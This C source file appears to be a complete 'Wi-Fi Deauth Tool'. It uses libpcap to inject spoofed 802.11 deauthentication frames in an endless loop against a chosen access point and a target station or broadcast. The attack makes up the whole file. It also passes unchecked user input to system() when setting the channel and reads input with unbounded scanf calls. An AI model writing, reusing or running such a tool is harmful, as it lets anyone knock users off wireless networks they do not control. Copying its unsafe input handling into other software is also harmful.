#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "protocol.h"

int parse_mac_address(char *mac_str, uint8_t *mac_addr) {
    if (strlen(mac_str) != 17) return -1;
    char *ptr = mac_str;
    for (int i = 0; i < 6; i++) {
        mac_addr[i] = (uint8_t)strtoul(ptr, &ptr, 16);
        ptr++; 
    }
    return 0;
}


void start_deauth_attack(char *interface, char *ap_mac_str, char *target_mac_str) {
    uint8_t access_point_mac[6];
    uint8_t target_station_mac[6];
    char errbuf[PCAP_ERRBUF_SIZE];
    
    if (parse_mac_address(ap_mac_str, access_point_mac) != 0) {
        printf("Error: Invalid AP MAC address format.\n");
        return;
    }

    if (strcmp(target_mac_str, "broadcast") == 0 || strcmp(target_mac_str, "BROADCAST") == 0) {
        memset(target_station_mac, 0xFF, 6);
    } else {
        if (parse_mac_address(target_mac_str, target_station_mac) != 0) {
            printf("Error: Invalid Target MAC address format.\n");
            return;
        }
    }

    pcap_t *handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        printf("Couldn't open device %s: %s\n", interface, errbuf);
        return;
    }

    radiotap_header_t radiotap_header = {0, 0, 8, 0};
    dot11_header_t dot11_header = {{0xC0, 0x00}, 0, {0}, {0}, {0}, 0};
    deauth_body_t deauth_body = {7};

    memcpy(dot11_header.receiver_address, target_station_mac, 6);
    memcpy(dot11_header.transmitter_address, access_point_mac, 6);
    memcpy(dot11_header.bssid, access_point_mac, 6);

    uint8_t packet[sizeof(radiotap_header) + sizeof(dot11_header) + sizeof(deauth_body)];
    memcpy(packet, &radiotap_header, sizeof(radiotap_header));
    memcpy(packet + sizeof(radiotap_header), &dot11_header, sizeof(dot11_header));
    memcpy(packet + sizeof(radiotap_header) + sizeof(dot11_header), &deauth_body, sizeof(deauth_body));

    printf("\n[+] Starting Deauth Attack...\n");
    printf("Interface: %s\n", interface);
    printf("AP MAC   : %s\n", ap_mac_str);
    printf("Target   : %s\n", target_mac_str);
    printf("Press Ctrl+C to stop.\n\n");

    while (1) {
        if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
            printf("Error sending the packet: %s\n", pcap_geterr(handle));
            break;
        }
        usleep(100000);
    }

    pcap_close(handle);
}

int main() {
    int choice;
    char interface[64];
    char ap_mac[20];
    char target_mac[20];

    while(1) {
        printf("=============================\n");
        printf("     Wi-Fi Deauth Tool\n");
        printf("=============================\n");
        printf("1. Start Deauth Attack\n");
        printf("2. Exit\n");
        printf("> ");
        scanf("%d", &choice);

        if (choice == 1) {
            printf("\nEnter Interface Name (e.g. wlan0): ");
            scanf("%s", interface);
            
            printf("Enter AP MAC Address: ");
            scanf("%s", ap_mac);
            
            printf("Enter Target MAC Address (or 'broadcast'): ");
            scanf("%s", target_mac);

            int channel;
            printf("Enter Channel: ");
            scanf("%d", &channel);

            char command[128];
            snprintf(command, sizeof(command), "iwconfig %s channel %d", interface, channel);
            if (system(command) != 0) {
                printf("Error: Failed to set channel.\n");
                continue;
            }
            printf("[*] Channel set to %d\n", channel);

            start_deauth_attack(interface, ap_mac, target_mac);
        } 
        else if (choice == 2) {
            break;
        } 
        else {
            printf("Wrong Input\n");
        }
    }
    return 0;
}
